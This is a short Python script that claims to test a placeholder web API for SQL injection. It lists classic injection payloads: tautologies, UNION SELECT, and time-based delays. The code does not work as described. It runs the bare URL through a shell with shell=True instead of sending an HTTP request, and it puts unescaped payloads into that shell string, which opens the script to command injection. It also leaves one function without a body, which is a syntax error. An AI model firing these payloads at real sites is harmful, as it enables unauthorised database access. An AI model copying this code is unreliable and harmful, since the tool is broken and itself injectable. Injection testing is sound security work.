#!/usr/bin/env python3
"""
Test for basic SQL injection vulnerabilities.
"""
import subprocess
import time
import sys
def try_sql_injection(cmd, payload):
    """Run command with potential payloads."""
    
    # Build the complete command string
    test_cmd = f"{cmd} '{payload}'"
    
    print(f"Trying: {test_cmd}")
    
    try:
        start_time = time.time()
        
        result = subprocess.run(
            test_cmd, shell=True, 
            capture_output=True, text=True,
            timeout=10  # Avoid hanging
        )
        
        execution_time = time.time() - start_time
        
        if result.returncode != 0 or "error" in result.stderr.lower():
            print(f"[VULNERABLE] Error occurred with payload: {payload}")
            
        elif len(result.stdout) > 500 and "select" in cmd:
            # Unusually large output might indicate data leakage
            print("[INFO] Large output detected")
        
        else:
            if execution_time > 3:
                # Slow queries can be a sign of problems
                print(f"[WARNING] Query slow ({execution_time:.2f}s): {payload}")
    
    except subprocess.TimeoutExpired:
        print(f"[TIMEOUT] Payload caused timeout: {payload}")
def main():
    vulnerable_url = "http://example-vulnerable-app.com/api/search"
    
    # Common payloads that might trigger vulnerabilities
    test_payloads = [
        "' OR '1'='1", 
        "' UNION SELECT NULL",
        "' WAITFOR DELAY '0:0:5'",
        "' OR sleep(3)--",
        "admin'--",
        "' OR 1=1--",
        "' OR waitfor delay '0:0:2'--"
    ]
    
    # Test each payload with different injection points
    for payload in test_payloads:
        
        # Try basic direct payloads first
        try_sql_injection(f"{vulnerable_url}", payload)
        
        # Then try as parameters
        for param in ['q', 'search', 'query']:
            try_sql_injection(f"{vulnerable_url}?{param}={payload}", "")
def report_results():
    """Summarize findings."""
    
    # Add detection logic here
    
if __name__ == "__main__":
    main()
